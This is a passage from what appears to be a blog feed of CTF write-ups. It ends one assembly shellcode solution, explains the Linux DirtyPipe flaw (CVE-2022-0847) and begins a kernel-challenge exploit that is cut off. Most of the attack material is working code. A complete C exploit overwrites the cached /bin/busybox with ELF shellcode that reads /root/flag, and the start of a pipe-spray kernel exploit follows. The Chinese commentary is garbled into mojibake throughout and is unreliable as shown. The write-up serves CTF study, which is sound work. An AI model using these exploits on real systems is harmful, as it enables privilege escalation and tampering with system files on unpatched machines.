find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0x31<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov     r14, rax            ; r14: syscall; ret<br><br><br>mmap_flag:<br>    mov rax, 0x9<br>    mov rdi, 0x1337331337<br>    mov rsi, 0x1000<br>    mov rdx, 2<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r14 ; call syscall<br>open_flag:<br>    mov     rdi, 0x1337331337    ; ld script will ensure 0x31337 is mapped and RW<br>    lea     rsi, [flag]<br>    call    strcpy<br>    <br>    mov     rdi, 0x1337331337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;flag&quot;, 0) -&gt; fd 3<br><br>open_elf:<br>    mov     rdi, 0x1337331337    ; ld script will ensure 0x31337 is mapped and RW<br>    mov     rsi, r13<br>    call    strcpy<br>    <br>    mov     rdi, 0x1337331337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;ELF_FILE&quot;, 0) -&gt; fd 4<br>; enter 32 bit<br>    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    call    retf_to_32<br><br>flag:       db          &quot;flag&quot;, 0<br>message:    db          &quot;test output!!!!!&quot;, 0<br>sc:         db          0x90, 0x90<br>sc_len:     dq          2<br>section     .bss noexec<br>    align 16<br>pad:        resb        0x1000<br>stack:      resb        0x1000<br></code></pre></td></tr></table></figure><p>filenameåœ°å€ç›´æ¥mmapäº†</p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>æ ˆä¸Šæœ‰ä»€ä¹ˆä¸œè¥¿ï¼ˆenvpï¼Œauxvâ€¦â€¦ï¼‰ï¼Œé“¾æ¥è£…è½½ä¸åº“ï¼Œä¹</li><li>ç¨‹åºå¯åŠ¨ï¼Œæ‰§è¡Œç¨‹åºçš„å†…å­˜æ˜ å°„å’Œæƒé™æ§åˆ¶ä»€ä¹ˆçš„</li><li>ç³»ç»Ÿè°ƒç”¨ï¼ˆæœ‰ç‚¹å¿˜äº†ç”¨æˆ·æ€å’Œå†…æ ¸æ€åˆ‡æ¢çš„è¿‡ç¨‹äº†(Ë‰â–½Ë‰ï¼›)â€¦ï¼‰</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847 DirtyPipe</title>
    <link href="/2024/01/12/CVE-2022-0847-DirtyPipe/"/>
    <url>/2024/01/12/CVE-2022-0847-DirtyPipe/</url>
    
    <content type="html"><![CDATA[<p>DirtyPipeï¼ä¹…ä»°ä¹…ä»°doge</p><p>ç”¨çš„TPCTFçš„coreçš„å†…æ ¸ï¼Œé¡ºå¸¦ä¸€ä¸ªwater-kerçš„æ–°åšæ³•</p><p>èƒŒç–¼&#x2F;(ã„’oã„’)&#x2F;~~</p><span id="more"></span><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼š&gt;5.8ï¼Œåœ¨5.10.102ï¼Œ5.15.25ï¼Œ5.16.11è¢«ä¿®å¤</p><p>åªæä¸€äº›æˆ‘è§‰å¾—è¦æ³¨æ„çš„å†…å®¹</p><h1 id="DirtyPipe"><a href="#DirtyPipe" class="headerlink" title="DirtyPipe"></a>DirtyPipe</h1><p>ä¸»è¦æ³¨æ„å¾€spliceå¾€pipeé‡Œå†™çš„å‡½æ•°copy_page_to_iter_pipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br>    <span class="hljs-comment">// å–offsetå’Œpipe_buffer</span><br>off = i-&gt;iov_offset;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><br>    <br>    <span class="hljs-keyword">if</span> (off) &#123;<br>        <span class="hljs-comment">// æ˜¯å¦å¯ä»¥ç»­å†™ï¼ˆä¹‹å‰å·²ç»å¾€pipeé‡Œå†™è¿‡è¿™ä¸€é¡µçš„å†…å®¹ï¼Œpageå·²ç»æŒ‚ä¸Šå»äº†ï¼‰</span><br><span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br>        <span class="hljs-comment">// æ›´æ–°pipe_bufferçš„lenå’Œiov_iterçš„offsetï¼Œè·³è‡³out</span><br>buf-&gt;len += bytes;<br>i-&gt;iov_offset += bytes;<br><span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-comment">// ä¸èƒ½ç»­å†™ï¼Œå–ä¸‹ä¸€ä¸ªpipe_buffer</span><br>i_head++;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// æ›´æ–°pipeï¼ŒæŠŠpageæŒ‚ä¸Šå»ï¼Œæ›´æ–°ä¸€ç³»åˆ—å‚æ•°</span><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>get_page(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>out:<br>i-&gt;count -= bytes;<br><span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§è‡´è¿‡ç¨‹</p><ul><li>åˆ¤æ–­æ˜¯å¦å¯ä»¥ç»­å†™ï¼ˆåŒä¸€ä¸ªpageï¼Œoffsetä¸€è‡´ï¼‰</li><li>ä¸å¯ç»­å†™åˆ™å–ä¸‹ä¸€ä¸ªpipe_buffer</li><li>æŠŠpageæŒ‚è¿›pipe_bufferï¼Œå¹¶è®¾ç½®ä¸€ç³»åˆ—å‚æ•°ï¼Œ<strong>æ²¡æœ‰æ›´æ–°flags</strong></li></ul><p>å¯ä»¥é€šè¿‡spliceçš„è¿‡ç¨‹å‘ç°</p><ul><li>å¾€pipeä¸­å†™æ—¶å¹¶ä¸å­˜åœ¨æ•°æ®çš„å¤åˆ¶ï¼Œè€Œæ˜¯ç›´æ¥æŠŠpage cacheå¯¹åº”çš„pageæŒ‚è¿›äº†pipe_buffer</li><li>spliceå¹¶æ²¡æœ‰åˆå§‹åŒ–flags</li></ul><p>åœ¨water-kerä¸­å‘ç°å½“flagsè®¾ç½®äº†PIPE_BUF_FLAG_CAN_MERGEå°±å¯ä»¥åœ¨pipe_bufferä¸­è¿›è¡Œç»­å†™ï¼Œé‚£ä¹ˆå¦‚æœ<strong>spliceå–åˆ°ä¸€ä¸ªæ®‹ç•™PIPE_BUF_FLAG_CAN_MERGEæ ‡å¿—çš„pipe_bufferå°±å¯ä»¥å¯¹page cacheè¿›è¡Œè¦†å†™</strong></p><p>åˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹</p><ul><li>æ‰“å¼€è¦ä¿®æ”¹çš„æ–‡ä»¶</li><li>å…ˆå†™éæ‰€æœ‰çš„pipe_bufferï¼Œå†è¯»å‡ºæ‰€æœ‰çš„pipe_bufferï¼Œè¿™æ ·æ‰€æœ‰çš„pipe_bufferå°±éƒ½æœ‰PIPE_BUF_FLAG_CAN_MERGEæ ‡å¿—äº†</li><li>spliceä¸€å­—èŠ‚</li><li>ç„¶åå°±å¯ä»¥è¦†å†™äº†</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ATTACK_FILE <span class="hljs-string">&quot;/bin/busybox&quot;</span></span><br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X] %s\n&quot;</span>, msg);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv, <span class="hljs-type">char</span>** env)</span><br>&#123;<br> <br>        <span class="hljs-type">int</span> fd;<br>        <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>        <span class="hljs-type">loff_t</span> offset;<br>        <span class="hljs-type">char</span> buf[PAGE_SIZE];<br> <br>        fd = open(ATTACK_FILE, O_RDONLY);<br>        <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t open target file&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t create pipe&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) <span class="hljs-keyword">if</span> (write(pipe_fd[<span class="hljs-number">1</span>], buf, PAGE_SIZE) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t write pipe&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) <span class="hljs-keyword">if</span> (read(pipe_fd[<span class="hljs-number">0</span>], buf, PAGE_SIZE) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t read pipe&quot;</span>);<br> <br>        offset = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (splice(fd, &amp;offset, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Failed at splice&quot;</span>);<br> <br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elfcode[] = &#123;<br>            <span class="hljs-comment">/*0x7f,*/</span> <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x68</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>,<br>                <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x6a</span>,<br>                <span class="hljs-number">0x02</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xff</span>,<br>                <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5f</span>,<br>                <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xEB</span><br>        &#125;;<br> <br>        <span class="hljs-keyword">if</span> (write(pipe_fd[<span class="hljs-number">1</span>], elfcode, <span class="hljs-keyword">sizeof</span>(elfcode)) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Failed to write page cache&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ”¹å®Œçš„busyboxå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œå‰©äº†ä¸€æ®µ</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/busybox.png" class title="busybox"><p>å®é™…æ‰§è¡Œçš„ä»£ç </p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/elfcode.png" class title="elfcode"><ul><li><p>å…ˆopen &#x2F;root&#x2F;flag</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/open.png" class title="open"></li><li><p>å†åˆ©ç”¨sendfileè¯»å‡ºflagçš„å†…å®¹</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/sendfile.png" class title="sendfile"></li></ul><h1 id="2023å¼ºç½‘æ‹Ÿæ€-water-ker"><a href="#2023å¼ºç½‘æ‹Ÿæ€-water-ker" class="headerlink" title="2023å¼ºç½‘æ‹Ÿæ€ water-ker"></a>2023å¼ºç½‘æ‹Ÿæ€ water-ker</h1><p>åŒºåˆ«è¿˜æ˜¯åœ¨å–å¾—ç¬¬äºŒä¸ªuafä¹‹å</p><ul><li><p>æ³„éœ²spliceä¹‹åçš„pageåœ°å€ï¼Œè¿™æ—¶flagså·²ç»æ˜¯0äº†</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/splice.png" class title="splice"></li><li><p>è¦†å†™ï¼ŒæŠŠflagsæ”¹ä¸º0x10</p></li><li><p>å†™å…¥elfcode</p></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM 200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><br><span class="hljs-type">int</span> fd_water;<br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> orig_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> victim_pid = PIPE_SPRAY_NUM / <span class="hljs-number">2</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *buf;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_chunk</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span> <span class="hljs-title">tmp</span> =</span> &#123;<br>        .buf = data,<br>    &#125;;<br>    ioctl(fd_water, <span class="hljs-number">0x20</span>, 